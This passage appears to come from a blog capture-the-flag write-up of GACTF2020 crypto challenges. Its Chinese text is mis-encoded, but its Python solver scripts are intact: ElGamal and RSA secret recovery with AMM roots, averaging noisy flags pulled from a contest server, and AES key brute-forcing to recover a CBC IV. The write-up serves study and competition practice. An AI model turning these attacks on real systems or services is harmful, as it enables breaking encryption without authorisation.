title="[é¢˜è§£åˆ†æ]"></a>[é¢˜è§£åˆ†æ]</h4><p>rä»¥LCGç”Ÿæˆ</p><script type="math/tex; mode=display">c1=g^{r}(mod\ p)\\c2=m\cdot h^{r}(mod\ p)\\c11=g^{(Br+A)\%q}(mod\ p)\\c22=m\cdot h^{(Br+A)\%q}(mod\ p)\\g^{q}\equiv 1(mod\ p)</script><p>å› æ­¤$c2^{B}\cdot h^{A}\cdot(c22)^{-1}=m^{B-1}(mod\ p)$ï¼Œä¸”åœ¨è¿™é¢˜é‡Œæ£€éªŒå‘ç°gcd(B-1,p-1)=1ï¼Œæ‰€ä»¥ç›´æ¥è¿˜åŸå¾—åˆ°m</p><p>å¾—åˆ°mï¼Œå³secretåï¼ŒçŸ¥<code>pow(flag,e,secret)=c</code>ï¼Œyafuè·‘æ¬¡secretï¼Œå¾—åˆ°åˆ†è§£ç»“æœ</p><p>(psï¼šyafuæŒºç¦»è°±çš„â€¦åˆ†è§£å‡ºçš„å› å­å¹‚æ¬¡éƒ½ä¸å‘Šè¯‰çš„â€¦åªæ˜¾ç¤ºå‡ºæ¥ä¸€éƒ¨åˆ†â€¦æ­ªæ—¥)</p><p>å‘ç°secretçš„ä¸€ä¸ªå› å­<code>m0=653551912583</code>ï¼Œä¸”å¹‚æ¬¡ä¸º15</p><p>ç”±äº<code>gcd(e,(m*(m0-1))//m0)=2</code>ï¼ŒåŒ–ç®€å¾—åˆ°câ€™åï¼Œcâ€™å³ä¸º$pow(flag,2,m0^{15})$ï¼ŒAMMæ±‚äºŒæ¬¡æ ¹å¾—åˆ°ç»“æœ</p><p>å¯¹$p^{k}$çš„AMMï¼ŒæŒ‰ç…§å¦‚ä¸‹paperç»™å‡ºçš„ç®—æ³•ï¼Œå°†qæ›¿æ¢æˆ$q^{k}$ï¼Œphiç­‰æ›¿æ¢ä¸‹å³å¯</p><p><img src= "/img/loading.gif" data-src="/2020/08/30/WriteUp-GACTF2020-Crypto/QNy9EWc7K4enJGu.png" alt></p><h4 id="exp"><a href="#exp" class="headerlink" title="[exp]"></a>[exp]</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">g, h, A, B, p, q = </span><br><span class="line">c1, c2 = </span><br><span class="line">c11, c22 = </span><br><span class="line">M = (pow(c2, B, p) * pow(h, A, p) * inverse(c22, p)) % p</span><br><span class="line"><span class="keyword">assert</span>(GCD(B<span class="number">-1</span>, p<span class="number">-1</span>) == <span class="number">1</span>)</span><br><span class="line">secret = int(pow(M, inverse(B<span class="number">-1</span>, p<span class="number">-1</span>), p))</span><br><span class="line"><span class="comment"># yafu factor</span></span><br><span class="line">m0 = <span class="number">653551912583</span></span><br><span class="line">m = m0**<span class="number">15</span></span><br><span class="line">c = </span><br><span class="line">e = <span class="number">0x1296</span></span><br><span class="line"><span class="keyword">assert</span>(GCD(e, (m*(m0<span class="number">-1</span>))//m0) == <span class="number">2</span>)</span><br><span class="line">c = int(pow(c, inverse(e//<span class="number">2</span>,(m*(m0<span class="number">-1</span>))//m0), m))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">AMM</span><span class="params">(delta, r, q, k = <span class="number">1</span>)</span>:</span> <span class="comment"># get one special a s.t. a**r \equiv delta % q**k where b_x | phi(q**k)</span></span><br><span class="line">    <span class="comment"># r, q are supposed to be primes</span></span><br><span class="line"></span><br><span class="line">    phi = (q - <span class="number">1</span>) * q**(k - <span class="number">1</span>)</span><br><span class="line">    mod = q ** k</span><br><span class="line">    <span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">        rho = getRandomRange(<span class="number">1</span>, mod)</span><br><span class="line">        <span class="keyword">if</span>(pow(rho, phi // r, mod) == <span class="number">1</span>):</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        t = <span class="number">0</span></span><br><span class="line">        s = phi</span><br><span class="line">        <span class="keyword">while</span> s % r == <span class="number">0</span>:</span><br><span class="line">            s //= r</span><br><span class="line">            t += <span class="number">1</span></span><br><span class="line">        <span class="keyword">assert</span> gcd(r, s) == <span class="number">1</span></span><br><span class="line">        alpha = inverse(r, s)</span><br><span class="line">        a, b, c, h = pow(rho, phi // r, mod),pow(delta, r * alpha - <span class="number">1</span>, mod), pow(rho, s, mod), <span class="number">1</span></span><br><span class="line">        j, k = <span class="number">0</span>, phi // (r * s)</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, t):</span><br><span class="line">            k //= r</span><br><span class="line">            d = pow(b, k, mod)</span><br><span class="line">            <span class="keyword">if</span> d == <span class="number">1</span>:</span><br><span class="line">                j = <span class="number">0</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                j = phi - discrete_log(d, a)</span><br><span class="line">            b, h, c = b * pow(c, r * j, mod) % mod, h * pow(c, j, mod), pow(c, r, mod)</span><br><span class="line">        <span class="keyword">return</span> pow(delta, alpha, mod) * h % mod</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">allroot</span><span class="params">(root, r, q, k = <span class="number">1</span>)</span>:</span></span><br><span class="line">    <span class="comment"># find all roots satisfy a**r \equiv delta % q**k</span></span><br><span class="line">    </span><br><span class="line">    phi = (q - <span class="number">1</span>) * q**(k - <span class="number">1</span>)</span><br><span class="line">    mod = q ** k</span><br><span class="line">    all_root = set()</span><br><span class="line">    all_root.add(root)</span><br><span class="line">    <span class="keyword">while</span> len(all_root) &lt; r:</span><br><span class="line">        new_root = root</span><br><span class="line">        unity = pow(getRandomRange(<span class="number">2</span>, mod), phi // r, mod)</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(r - <span class="number">1</span>):</span><br><span class="line">            new_root = (new_root * unity) % mod</span><br><span class="line">            all_root.add(new_root)</span><br><span class="line">    <span class="keyword">return</span> all_root</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> flag <span class="keyword">in</span> list(allroot(AMM(c, <span class="number">2</span>, m0, <span class="number">15</span>), <span class="number">2</span>, m0, <span class="number">15</span>)):</span><br><span class="line">    print(long_to_bytes(flag))</span><br><span class="line"><span class="comment"># b'you_4re_good_at_b0th_el94mal_and_rs4'</span></span><br></pre></td></tr></table></figure><h3 id="what-r-the-noise"><a href="#what-r-the-noise" class="headerlink" title="what_r_the_noise"></a>what_r_the_noise</h3><h4 id="é¢˜è§£åˆ†æ-2"><a href="#é¢˜è§£åˆ†æ-2" class="headerlink" title="[é¢˜è§£åˆ†æ]"></a>[é¢˜è§£åˆ†æ]</h4><p>å¯æ— é™æ¬¡è·å–flagå¸¦åå·®çš„asciiå€¼ï¼Œå–å¹³å‡å°±è¡Œ- -å°±è¿™å°±è¿™</p><p>çœ‹å‡ºçš„flagçš„æ„æ€ï¼Œåº”è¯¥å’Œå·®åˆ†éšç§æœ‰å…³ï¼Œå½³äº</p><h4 id="exp-1"><a href="#exp-1" class="headerlink" title="[exp]"></a>[exp]</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> tqdm <span class="keyword">import</span> tqdm</span><br><span class="line"></span><br><span class="line">io = remote(<span class="string">"124.71.145.165"</span>, <span class="string">"9999"</span>)</span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">":"</span>, <span class="string">"2"</span>)</span><br><span class="line">flag = [eval(_) <span class="keyword">for</span> _ <span class="keyword">in</span> io.recvline().strip().decode()[:<span class="number">-1</span>].split(<span class="string">","</span>)]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">remove_noise</span><span class="params">(flag, i)</span>:</span></span><br><span class="line">    flag_with_noise = [<span class="number">0</span>] * len(flag)</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">2</span>**i):</span><br><span class="line">        io.sendlineafter(<span class="string">":"</span>, <span class="string">"2"</span>)</span><br><span class="line">        new_flag_with_noise = [eval(_) <span class="keyword">for</span> _ <span class="keyword">in</span> io.recvline().strip().decode()[:<span class="number">-1</span>].split(<span class="string">","</span>)]</span><br><span class="line">        flag_with_noise = [flag_with_noise[i] + new_flag_with_noise[i] <span class="keyword">for</span> i <span class="keyword">in</span> range(len(flag))]</span><br><span class="line">    flag_with_noise = [_ / (<span class="number">2</span>**i) <span class="keyword">for</span> _ <span class="keyword">in</span> flag_with_noise]</span><br><span class="line">    flag = [(flag[i] + flag_with_noise[i]) / <span class="number">2</span> <span class="keyword">for</span> i <span class="keyword">in</span> range(len(flag))]</span><br><span class="line">    <span class="keyword">return</span> flag</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> tqdm(range(<span class="number">10</span>)):</span><br><span class="line">    flag = remove_noise(flag, i)</span><br><span class="line">    print(bytes([round(_) <span class="keyword">for</span> _ <span class="keyword">in</span> flag]))</span><br><span class="line">    </span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">[+] Opening connection to 124.71.145.165 on port 9999: Done</span></span><br><span class="line"><span class="string">  0%|                                                                                                                                                                                | 0/10 [00:00&lt;?, ?it/s]b'k^gufxyrt\\gnlvfrwcf_]anvo_ejodftensicq^ptjvfcy\x80'</span></span><br><span class="line"><span class="string"> 10%|â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–Š                                                                                                                                                       | 1/10 [00:00&lt;00:01,  7.45it/s]b'j_euf&#123;ypx_hnmvanvch__`n&#125;pabliffqfnshao_orjueaz~'</span></span><br><span class="line"><span class="string"> 20%|â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–Œ                                                                                                                                      | 2/10 [00:00&lt;00:01,  5.56it/s]b'hbdug|xpv`jnnwanvcf`banyr`dkgfdqfoshan`qqjvb`&#123;|'</span></span><br><span class="line"><span class="string"> 30%|â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–                                                                                                                     | 3/10 [00:00&lt;00:02,  3.47it/s]b'hacug|xou`kmow_lubh`bbows`dkegdrfntian_qqivabx&#125;'</span></span><br><span class="line"><span class="string"> 40%|â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–                                                                                                    | 4/10 [00:02&lt;00:03,  1.84it/s]b'g`cuf&#123;xot`kmow_mvcg`aaovt_dkfffrentiam_privaby&#125;'</span></span><br><span class="line"><span class="string"> 50%|â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆ                                                                                    | 5/10 [00:04&lt;00:05,  1.02s/it]b'g`ctf&#123;xou_jnow_mvcg_about_djfffrentiam_priv`cy&#125;'</span></span><br><span class="line"><span class="string"> 60%|â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–Š                                                                   | 6/10 [00:08&lt;00:08,  2.04s/it]b'gactf&#123;you_jnow_much_abous_difffrential_privacy&#125;'</span></span><br><span class="line"><span class="string"> 70%|â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–Œ                                                  | 7/10 [00:17&lt;00:12,  4.13s/it]b'gactf&#123;you_jnow_much_about_differential_privacy&#125;'</span></span><br><span class="line"><span class="string"> 80%|â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–                                 | 8/10 [00:35&lt;00:16,  8.27s/it]b'gactf&#123;you_know_much_about_differential_privacy&#125;'</span></span><br><span class="line"><span class="string">'''</span></span><br></pre></td></tr></table></figure><h3 id="EzAES"><a href="#EzAES" class="headerlink" title="EzAES"></a>EzAES</h3><h4 id="é¢˜è§£åˆ†æ-3"><a href="#é¢˜è§£åˆ†æ-3" class="headerlink" title="[é¢˜è§£åˆ†æ]"></a>[é¢˜è§£åˆ†æ]</h4><p><strong>Encryption</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">key = <span class="string">b'T0EyZaLRzQmNe2**'</span> <span class="comment"># $O(2^&#123;16&#125;)$</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encrypt</span><span class="params">(message,passphrase,iv)</span>:</span></span><br><span class="line">aes = AES.new(passphrase, AES.MODE_CBC, iv)</span><br><span class="line"><span class="keyword">return</span> aes.encrypt(message)</span><br><span class="line"></span><br><span class="line">h = hashlib.md5(key).hexdigest()</span><br><span class="line">SECRET = binascii.unhexlify(h)[:<span class="number">10</span>]</span><br><span class="line"><span class="keyword">with</span> open(<span class="string">'flag'</span>,<span class="string">'rb'</span>) <span class="keyword">as</span> f:</span><br><span class="line">IV = f.read().strip(<span class="string">b'gactf&#123;'</span>).strip(<span class="string">b'&#125;'</span>)</span><br><span class="line">message = <span class="string">b'AES CBC Mode is commonly used in data encryption. What do you know about it?'</span>+SECRET</span><br><span class="line">print(<span class="string">"Encrypted data: "</span>, binascii.hexlify(encrypt(pad(message),key,IV)))</span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">Encrypted data: b'a8**************************b1a923**************************011147**************************6e094e**************************cdb1c7**********a32c412a3e7474e584cd72481dab9dd83141706925d92bdd39e4'</span></span><br><span class="line"><span class="string">'''</span></span><br></pre></td></tr></table></figure><p>åˆ†æ®µprintä¸‹cipherå‘ç°ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">b'a8**************************b1a9'</span></span><br><span class="line"><span class="string">b'23**************************0111'</span></span><br><span class="line"><span class="string">b'47**************************6e09'</span></span><br><span class="line"><span class="string">b'4e**************************cdb1'</span></span><br><span class="line"><span class="string">b'c7**********a32c412a3e7474e584cd'</span></span><br><span class="line"><span class="string">b'72481dab9dd83141706925d92bdd39e4'</span></span><br></pre></td></tr></table></figure><p>äºæ˜¯åªè¦åœ¨$O(2^{16})$ä¸‹çˆ†ç ´keyï¼Œå–æœ€åä¸€å—ä½œECBè§£å¯†ï¼Œå†ä¸å·²çŸ¥çš„å€’äºŒå—å10byteså¼‚æˆ–ï¼Œå½“å¼‚æˆ–ç»“æœä¸ºmessageæœ«ä½padding(<code>b&#39;\x10&#39;*10</code>)ï¼Œå³æ‰¾åˆ°æ­£ç¡®key</p><p>æ¥ä¸‹æ¥ä»åå¾€å‰é€å—è¿›è¡ŒECBè§£å¯†ï¼ˆmessageå·²å…¨éƒ¨å¾—åˆ°ï¼‰ï¼Œå³å¯æ¨å‡ºiv</p><h4 id="exp-2"><a href="#exp-2" class="headerlink" title="[exp]"></a>[exp]</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">import</span> binascii, sys, hashlib</span><br><span class="line"></span><br><span class="line">key = list(<span class="string">b'T0EyZaLRzQmNe2**'</span>)</span><br><span class="line"></span><br><span class="line">KEYSIZE = <span class="number">16</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pad</span><span class="params">(message)</span>:</span></span><br><span class="line">    p = bytes((KEYSIZE - len(message) % KEYSIZE) * chr(KEYSIZE - len(message) % KEYSIZE),encoding=<span class="string">'utf-8'</span>)</span><br><span class="line">    <span class="keyword">return</span> message + p</span><br><span class="line"></span><br><span class="line">cipher = <span class="string">b'a8**************************b1a923**************************011147**************************6e094e**************************cdb1c7**********a32c412a3e7474e584cd72481dab9dd83141706925d92bdd39e4'</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">xor</span><span class="params">(a, b)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> bytes(x ^ y <span class="keyword">for</span> x, y <span class="keyword">in</span> zip(a, b))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0x100</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">0x100</span>):</span><br><span class="line">        k = bytes(key[:<span class="number">-2</span>] + [i, j])</span><br><span class="line">        h = hashlib.md5(k).hexdigest()</span><br><span class="line">        SECRET = binascii.unhexlify(h)[:<span class="number">10</span>]</span><br><span class="line">        aes = AES.new(k, AES.MODE_ECB)</span><br><span class="line">        <span class="keyword">if</span> xor(aes.decrypt(binascii.unhexlify(cipher[<span class="number">-32</span>:]))[<span class="number">-10</span>:], binascii.unhexlify(cipher[<span class="number">-52</span>:<span class="number">-32</span>])) == bytes([<span class="number">10</span>] * <span class="number">10</span>):</span><br><span class="line">            print(k)</span><br><span class="line">            print(SECRET)</span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">b'T0EyZaLRzQmNe2pd'</span></span><br><span class="line"><span class="string">b'\xfc\x89\xb4\xd5\xe2\x0b\xd2\xc6U\xae'</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"></span><br><span class="line">key = <span class="string">b'T0EyZaLRzQmNe2pd'</span></span><br><span class="line">SECRET = <span class="string">b'\xfc\x89\xb4\xd5\xe2\x0b\xd2\xc6U\xae'</span></span><br><span class="line">message = pad(<span class="string">b'AES CBC Mode is commonly used in data encryption. What do you know about it?'</span>+SECRET)</span><br><span class="line">ct = binascii.unhexlify(cipher[<span class="number">-32</span>:])</span><br><span class="line">aes = AES.new(key, AES.MODE_ECB)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">5</span>):</span><br><span class="line">    ct = xor(aes.decrypt(ct), message[<span class="number">-16</span>:])</span><br><span class="line">    message = message[:<span class="number">-16</span>]</span><br><span class="line">iv = xor(aes.decrypt(ct), message[<span class="number">-16</span>:])</span><br><span class="line">iv</span><br><span class="line"><span class="comment"># b'9j_for_aes_cbc!!'</span></span><br></pre></td></tr></table></figure><h3 id="square"><a href="#square" class="headerlink" title="square"></a>square</h3><h4 id="é¢˜è§£åˆ†æ-4"><a href="#é¢˜è§£åˆ†æ-4" class="headerlink" title="[é¢˜è§£åˆ†æ]"></a>[é¢˜è§£åˆ†æ]</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">'Please give me 100 (x,y) which satisfies x**2 = ( 1**2 + 2**2 + ... + y**2) / y\n'</span></span><br></pre></td></tr></table></figure><p>æ‰¾æ»¡è¶³$6x^{2}=(y+1)(2y+1)$çš„100ç»„(x, y)</p><p>ç›´æ¥æš´åŠ›è·‘å‡ºå‰ä¸‰ç»„$(x, y)$ï¼Œç„¶åä¸Šoeisæ‰¾åˆ°é€’æ¨å¼</p><p><a href="https://oeis.org/search?q=1%2C337%2C65521&amp;sort=&amp;language=&amp;go=Search" target="_blank" rel="noopener">https://oeis.org/search?q=1%2C337%2C65521&amp;sort=&amp;language=&amp;go=Search</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">FORMULA</span><br><span class="line">a(n) &#x3D; ((7&#x2F;2 + 2*sqrt(3))*(97 + 56*sqrt(3))^n + (7&#x2F;2 - 2*sqrt(3))*(97 - 56*sqrt(3))^n - 3)&#x2F;4.</span><br><span class="line"></span><br><span class="line">a(n) &#x3D; (floor((7&#x2F;2 + 2*sqrt(3))*(97 + 56*sqrt(3))^n) - 2)&#x2F;4.</span><br><span class="line"></span><br><span class="line">a(n+3) &#x3D; 195*(a(n+2) - a(n+1)) + a(n).</span><br></pre></td></tr></table></figure><h4 id="exp-3"><a href="#exp-3" class="headerlink" 